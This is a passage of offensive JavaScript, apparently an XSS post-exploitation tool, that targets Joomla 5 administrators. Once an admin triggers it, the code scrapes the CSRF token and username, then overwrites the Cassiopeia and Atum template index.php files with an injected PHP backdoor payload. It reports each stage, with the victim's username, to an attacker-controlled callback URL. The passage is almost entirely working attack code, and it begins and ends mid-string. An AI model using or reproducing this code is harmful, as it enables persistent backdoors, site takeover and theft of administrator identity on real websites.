get%28%27fluidContainer%27%29+%3F+%27wrapper-fluid%27+%3A+%27wrapper-static%27%3B%0D%0A%0D%0A%24this-%3EsetMetaData%28%27viewport%27%2C+%27width%3Ddevice-width%2C+initial-scale%3D1%27%29%3B%0D%0A%0D%0A%24stickyHeader+%3D+%24this-%3Eparams-%3Eget%28%27stickyHeader%27%29+%3F+%27position-sticky+sticky-top%27+%3A+%27%27%3B%0D%0A%0D%0A%2F%2F+Defer+fontawesome+for+increased+performance.+Once+the+page+is+loaded+javascript+changes+it+to+a+stylesheet.%0D%0A%24wa-%3EgetAsset%28%27style%27%2C+%27fontawesome%27%29-%3EsetAttribute%28%27rel%27%2C+%27lazy-stylesheet%27%29%3B%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3E%0D%0A%0D%0A%3Chead%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22metas%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22styles%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22scripts%22+%2F%3E%0D%0A%3C%2Fhead%3E%0D%0A%0D%0A%3Cbody+class%3D%22site+%3C%3Fphp+echo+%24option%0D%0A++++.+%27+%27+.+%24wrapper%0D%0A++++.+%27+view-%27+.+%24view%0D%0A++++.+%28%24layout+%3F+%27+layout-%27+.+%24layout+%3A+%27+no-layout%27%29%0D%0A++++.+%28%24task+%3F+%27+task-%27+.+%24task+%3A+%27+no-task%27%29%0D%0A++++.+%28%24itemid+%3F+%27+itemid-%27+.+%24itemid+%3A+%27%27%29%0D%0A++++.+%28%24pageclass+%3F+%27+%27+.+%24pageclass+%3A+%27%27%29%0D%0A++++.+%24hasClass%0D%0A++++.+%28%24this-%3Edirection+%3D%3D+%27rtl%27+%3F+%27+rtl%27+%3A+%27%27%29%3B%0D%0A%3F%3E%22%3E%0D%0A++++%3Cheader+class%3D%22header+container-header+full-width%3C%3Fphp+echo+%24stickyHeader+%3F+%27+%27+.+%24stickyHeader+%3A+%27%27%3B+%3F%3E%22%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27topbar%27%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22container-topbar%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22topbar%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27below-top%27%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-below-top%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22below-top%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27brand%27%2C+1%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22navbar-brand%22%3E%0D%0A++++++++++++++++++++%3Ca+class%3D%22brand-logo%22+href%3D%22%3C%3Fphp+echo+%24this-%3Ebaseurl%3B+%3F%3E%2F%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+%24logo%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27siteDescription%27%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++++++%3Cdiv+class%3D%22site-description%22%3E%3C%3Fphp+echo+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27siteDescription%27%29%29%3B+%3F%3E%3C%2Fdiv%3E%0D%0A++++++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27menu%27%2C+true%29+%7C%7C+%24this-%3EcountModules%28%27search%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-nav%22%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27menu%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22menu%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27search%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22container-search%22%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22search%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++%3C%2Fheader%3E%0D%0A%0D%0A++++%3Cdiv+class%3D%22site-grid%22%3E%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27banner%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22container-banner+full-width%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22banner%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27top-a%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-top-a%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top-a%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27top-b%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-top-b%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top-b%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27sidebar-left%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-sidebar-left%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22sidebar-left%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-component%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22breadcrumbs%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22main-top%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A++++++++++++%3Cmain%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A++++++++++++%3C%2Fmain%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22main-bottom%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27sidebar-right%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-sidebar-right%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22sidebar-right%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom-a%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-bottom-a%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom-a%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom-b%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-bottom-b%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom-b%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%0D%0A++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27footer%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cfooter+class%3D%22container-footer+footer+full-width%22%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22footer%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%2Ffooter%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27backTop%27%29+%3D%3D+1%29+%3A+%3F%3E%0D%0A++++++++%3Ca+href%3D%22%23top%22+id%3D%22back-top%22+class%3D%22back-to-top-link%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27TPL_CASSIOPEIA_BACKTOTOP%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++%3Cspan+class%3D%22icon-arrow-up+icon-fw%22+aria-hidden%3D%22true%22%3E%3C%2Fspan%3E%0D%0A++++++++%3C%2Fa%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+style%3D%22none%22+%2F%3E%0D%0A%3C%2Fbody%3E%0D%0A%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Fproc%2Fself%2Fcwd%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Cassiopeia) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Cassiopeia5()",
                                    "About": "You can trigger your backdoor in any application file/endpoint",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Cassiopeia) Template",
                                    "Module": "JLEditTemplates.Cassiopeia5()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                            "Module": "JLEditTemplates.Cassiopeia5()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Joomla 5.x.x Admin Template: (Atum)
    function Atum5() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates&client_id=1", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=1",
                                "Module": "JLEditTemplates.Atum5()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var URL = _stage1.responseText.match(/<a[^>]*\s*class\s*=\s*["'][^"']*dropdown-item[^"']*["'][^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>/i)[1];
                URL = URL.replace(/&amp;/g, '&');
                URL = URL.substring(1);
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + URL, false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract (Atum) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Atum Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "isMedia=0&jform%5Bsource%5D=%3C%3Fphp%0D%0A%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Administrator%0D%0A+*+%40subpackage++Templates.Atum%0D%0A+*+%40copyright+++%28C%29+2016+Open+Source+Matters%2C+Inc.+%3Chttps%3A%2F%2Fwww.joomla.org%3E%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*+%40since+++++++4.0.0%0D%0A+*%2F%0D%0A%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0Ause+Joomla%5CCMS%5CFactory%3B%0D%0Ause+Joomla%5CCMS%5CHTML%5CHTMLHelper%3B%0D%0Ause+Joomla%5CCMS%5CLanguage%5CText%3B%0D%0Ause+Joomla%5CCMS%5CLayout%5CLayoutHelper%3B%0D%0Ause+Joomla%5CCMS%5CRouter%5CRoute%3B%0D%0Ause+Joomla%5CCMS%5CUri%5CUri%3B%0D%0A%0D%0A%2F**+%40var+%5CJoomla%5CCMS%5CDocument%5CHtmlDocument+%24this+*%2F%0D%0A%0D%0A%24app+++%3D+Factory%3A%3AgetApplication%28%29%3B%0D%0A%24input+%3D+%24app-%3EgetInput%28%29%3B%0D%0A%24wa++++%3D+%24this-%3EgetWebAssetManager%28%29%3B%0D%0A%0D%0A%2F%2F+Detecting+Active+Variables%0D%0A%24option+++++++%3D+%24input-%3Eget%28%27option%27%2C+%27%27%29%3B%0D%0A%24view+++++++++%3D+%24input-%3Eget%28%27view%27%2C+%27%27%29%3B%0D%0A%24layout+++++++%3D+%24input-%3Eget%28%27layout%27%2C+%27default%27%29%3B%0D%0A%24task+++++++++%3D+%24input-%3Eget%28%27task%27%2C+%27display%27%29%3B%0D%0A%24cpanel+++++++%3D+%24option+%3D%3D%3D+%27com_cpanel%27+%7C%7C+%28%24option+%3D%3D%3D+%27com_admin%27+%26%26+%24view+%3D%3D%3D+%27help%27%29%3B%0D%0A%24hiddenMenu+++%3D+%24app-%3EgetInput%28%29-%3Eget%28%27hidemainmenu%27%29%3B%0D%0A%24sidebarState+%3D+%24input-%3Ecookie-%3Eget%28%27atumSidebarState%27%2C+%27%27%29%3B%0D%0A%0D%0A%2F%2F+Getting+user+accessibility+settings%0D%0A%24a11y_mono++++++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_mono%27%2C+%27%27%29%3B%0D%0A%24a11y_contrast++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_contrast%27%2C+%27%27%29%3B%0D%0A%24a11y_highlight+%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_highlight%27%2C+%27%27%29%3B%0D%0A%24a11y_font++++++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_font%27%2C+%27%27%29%3B%0D%0A%0D%0A%2F%2F+Browsers+support+SVG+favicons%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fsvg%2Bxml%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27favicon.ico%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27alternate+icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fvnd.microsoft.icon%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon-pinned.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27mask-icon%27%2C+%27rel%27%2C+%5B%27color%27+%3D%3E+%27%23000%27%5D%29%3B%0D%0A%0D%0A%2F%2F+Template+params%0D%0A%24logoBrandLarge++%3D+%24this-%3Eparams-%3Eget%28%27logoBrandLarge%27%29%0D%0A++++%3F+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandLarge%27%29%2C+ENT_QUOTES%29%0D%0A++++%3A+Uri%3A%3Aroot%28false%29+.+%27media%2Ftemplates%2Fadministrator%2Fatum%2Fimages%2Flogos%2Fbrand-large.svg%27%3B%0D%0A%24logoBrandSmall+%3D+%24this-%3Eparams-%3Eget%28%27logoBrandSmall%27%29%0D%0A++++%3F+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandSmall%27%29%2C+ENT_QUOTES%29%0D%0A++++%3A+Uri%3A%3Aroot%28false%29+.+%27media%2Ftemplates%2Fadministrator%2Fatum%2Fimages%2Flogos%2Fbrand-small.svg%27%3B%0D%0A%0D%0A%24logoBrandLargeAlt+%3D+empty%28%24this-%3Eparams-%3Eget%28%27logoBrandLargeAlt%27%29%29+%26%26+empty%28%24this-%3Eparams-%3Eget%28%27emptyLogoBrandLargeAlt%27%29%29%0D%0A++++%3F+%27%27%0D%0A++++%3A+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandLargeAlt%27%2C+%27%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29%3B%0D%0A%24logoBrandSmallAlt+%3D+empty%28%24this-%3Eparams-%3Eget%28%27logoBrandSmallAlt%27%29%29+%26%26+empty%28%24this-%3Eparams-%3Eget%28%27emptyLogoBrandSmallAlt%27%29%29%0D%0A++++%3F+%27%27%0D%0A++++%3A+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandSmallAlt%27%2C+%27%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29%3B%0D%0A%0D%0A%2F%2F+Get+the+hue+value%0D%0Apreg_match%28%27%23%5Ehsla%3F%5C%28%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%28%3F%3A.%5Cd%2B%29%3F%29%3F%5C%29%24%23i%27%2C+%24this-%3Eparams-%3Eget%28%27hue%27%2C+%27hsl%28214%2C+63%25%2C+20%25%29%27%29%2C+%24matches%29%3B%0D%0A%0D%0A%24linkColor+%3D+%24this-%3Eparams-%3Eget%28%27link-color%27%2C+%27%232a69b8%27%29%3B%0D%0Alist%28%24r%2C+%24g%2C+%24b%29+%3D+sscanf%28%24linkColor%2C+%22%23%2502x%2502x%2502x%22%29%3B%0D%0A%0D%0A%24linkColorDark+%3D+%24this-%3Eparams-%3Eget%28%27link-color-dark%27%2C+%27%237fa5d4%27%29%3B%0D%0Alist%28%24rd%2C+%24gd%2C+%24bd%29+%3D+sscanf%28%24linkColorDark%2C+%22%23%2502x%2502x%2502x%22%29%3B%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0A%2F%2F+Enable+assets%0D%0A%24wa-%3EusePreset%28%27template.atum.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%29%0D%0A++++-%3EuseStyle%28%27template.active.language%27%29%0D%0A++++-%3EuseStyle%28%27template.user%27%29%0D%0A++++-%3EaddInlineStyle%28%27%3Aroot+%7B%0D%0A%09%09--hue%3A+%27+.+%24matches%5B1%5D+.+%27%3B%0D%0A%09%09--template-bg-light%3A+%27+.+%24this-%3Eparams-%3Eget%28%27bg-light%27%2C+%27%23f0f4fb%27%29+.+%27%3B%0D%0A%09%09--template-text-dark%3A+%27+.+%24this-%3Eparams-%3Eget%28%27text-dark%27%2C+%27%23495057%27%29+.+%27%3B%0D%0A%09%09--template-text-light%3A+%27+.+%24this-%3Eparams-%3Eget%28%27text-light%27%2C+%27%23ffffff%27%29+.+%27%3B%0D%0A%09%09--link-color%3A+%27+.+%24linkColor+.+%27%3B%0D%0A%09%09--link-color-rgb%3A+%27+.+%24r+.+%27%2C%27+.+%24g+.+%27%2C%27+.+%24b+.+%27%3B%0D%0A%09%09--template-special-color%3A+%27+.+%24this-%3Eparams-%3Eget%28%27special-color%27%2C+%27%23001B4C%27%29+.+%27%3B%0D%0A%09%7D%27%29%0D%0A++++-%3EaddInlineStyle%28%27%40media+%28prefers-color-scheme%3A+dark%29+%7B+%3Aroot+%7B%0D%0A%09%09--link-color%3A+%27+.+%24linkColorDark+.+%27%3B%0D%0A%09%09--link-color-rgb%3A+%27+.+%24rd+.+%27%2C%27+.+%24gd+.+%27%2C%27+.+%24bd+.+%27%3B%0D%0A%09%7D%7D%27%29%3B%0D%0A%0D%0A%2F%2F+Override+%27template.active%27+asset+to+set+correct+ltr%2Frtl+dependency%0D%0A%24wa-%3EregisterStyle%28%27template.active%27%2C+%27%27%2C+%5B%5D%2C+%5B%5D%2C+%5B%27template.atum.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%5D%29%3B%0D%0A%0D%0A%2F%2F+Set+some+meta+data%0D%0A%24this-%3EsetMetaData%28%27viewport%27%2C+%27width%3Ddevice-width%2C+initial-scale%3D1%27%29%3B%0D%0A%0D%0A%24monochrome+%3D+%28bool%29+%24this-%3Eparams-%3Eget%28%27monochrome%27%29%3B%0D%0A%0D%0AText%3A%3Ascript%28%27TPL_ATUM_MORE_ELEMENTS%27%29%3B%0D%0A%0D%0A%2F%2F+%40see+administrator%2Ftemplates%2Fatum%2Fhtml%2Flayouts%2Fstatus.php%0D%0A%24statusModules+%3D+LayoutHelper%3A%3Arender%28%27status%27%2C+%5B%27modules%27+%3D%3E+%27status%27%5D%29%3B%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3C%3Fphp+echo+%24a11y_font+%3F+%27+class%3D%22a11y_font%22%27+%3A+%27%27%3B+%3F%3E%3E%0D%0A%3Chead%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22metas%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22styles%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22scripts%22+%2F%3E%0D%0A%3C%2Fhead%3E%0D%0A%0D%0A%3Cbody+data-color-scheme-os+class%3D%22admin+%3C%3Fphp+echo+%24option+.+%27+view-%27+.+%24view+.+%27+layout-%27+.+%24layout+.+%28%24task+%3F+%27+task-%27+.+%24task+%3A+%27%27%29+.+%28%24monochrome+%7C%7C+%24a11y_mono+%3F+%27+monochrome%27+%3A+%27%27%29+.+%28%24a11y_contrast+%3F+%27+a11y_contrast%27+%3A+%27%27%29+.+%28%24a11y_highlight+%3F+%27+a11y_highlight%27+%3A+%27%27%29%3B+%3F%3E%22%3E%0D%0A%3Cnoscript%3E%0D%0A++++%3Cdiv+class%3D%22alert+alert-danger%22+role%3D%22alert%22%3E%0D%0A++++++++%3C%3Fphp+echo+Text%3A%3A_%28%27JGLOBAL_WARNJAVASCRIPT%27%29%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fnoscript%3E%0D%0A%0D%0A%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22customtop%22+style%3D%22none%22+%2F%3E%0D%0A%0D%0A%3C%3Fphp+%2F%2F+Header+%3F%3E%0D%0A%3Cheader+id%3D%22header%22+class%3D%22header%22%3E%0D%0A++++%3Cdiv+class%3D%22header-inside%22%3E%0D%0A++++++++%3Cdiv+class%3D%22header-title+d-flex%22%3E%0D%0A++++++++++++%3Cdiv+class%3D%22d-flex+align-items-center%22%3E%0D%0A++++++++++++++++%3C%3Fphp+%2F%2F+No+home+link+in+edit+mode+%28so+users+can+not+jump+out%29+and+control+panel+%28for+a11y+reasons%29+%3F%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24hiddenMenu+%7C%7C+%24cpanel%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22logo+%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27small%27+%3A+%27%27%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandLarge%2C+%24logoBrandLargeAlt%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandSmall%2C+%24logoBrandSmallAlt%2C+%5B%27class%27+%3D%3E+%27logo-collapsed%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+else+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Ca+class%3D%22logo+%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27small%27+%3A+%27%27%3B+%3F%3E%22+href%3D%22%3C%3Fphp+echo+Route%3A%3A_%28%27index.php%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandLarge%2C+Text%3A%3A_%28%27TPL_ATUM_BACK_TO_CONTROL_PANEL%27%29%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandSmall%2C+Text%3A%3A_%28%27TPL_ATUM_BACK_TO_CONTROL_PANEL%27%29%2C+%5B%27class%27+%3D%3E+%27logo-collapsed%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22title%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+echo+%24statusModules%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fheader%3E%0D%0A%0D%